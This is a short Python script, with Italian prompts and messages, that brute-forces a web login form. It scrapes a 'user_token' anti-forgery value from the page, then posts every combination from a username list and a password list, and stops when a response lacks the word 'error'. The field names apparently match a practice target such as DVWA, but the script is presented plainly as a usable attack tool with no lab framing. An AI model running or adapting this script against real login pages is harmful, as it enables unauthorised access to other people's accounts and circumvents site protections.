import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

def main():
    url = input("Inserisci l'URL della pagina di login: ")
    user_file = input("Inserisci il file degli username: ")
    password_file = input("Inserisci il file delle password: ")

    try:
        session = requests.Session()
        response = session.get(url)
        response.raise_for_status()  # Check for HTTP errors
    except requests.RequestException as e:
        print(Fore.RED + f"Errore nella richiesta GET: {e}" + Style.RESET_ALL)
        return

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'user_token'})['value']
        if not token:
            raise ValueError("Token non trovato")
    except (AttributeError, TypeError, ValueError) as e:
        print(Fore.RED + f"Errore nel parsing HTML o token non trovato: {e}" + Style.RESET_ALL)
        return

    try:
        with open(user_file, 'r') as u_file:
            usernames = [line.strip() for line in u_file.readlines()]
        with open(password_file, 'r') as p_file:
            passwords = [line.strip() for line in p_file.readlines()]
    except FileNotFoundError as e:
        print(Fore.RED + f"Errore nell'apertura dei file: {e}" + Style.RESET_ALL)
        return

    for username in usernames:
        for password in passwords:
            print(Fore.YELLOW + f"Tentativo con Username: {username} e Password: {password}" + Style.RESET_ALL)
            data =  {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': token,
            } 
            try:
                response = session.post(url, data=data)
                response.raise_for_status()  # Check for HTTP errors
            except requests.RequestException as e:
                print(Fore.RED + f"Errore nella richiesta POST: {e}" + Style.RESET_ALL)
                continue

            if "error" not in response.text.lower():
                print(Fore.GREEN + "Login effettuato con successo!" + Style.RESET_ALL)
                return
    print(Fore.RED + "Fallito: Nessun username e password valido trovato" + Style.RESET_ALL)

if __name__ == "__main__":
    main()


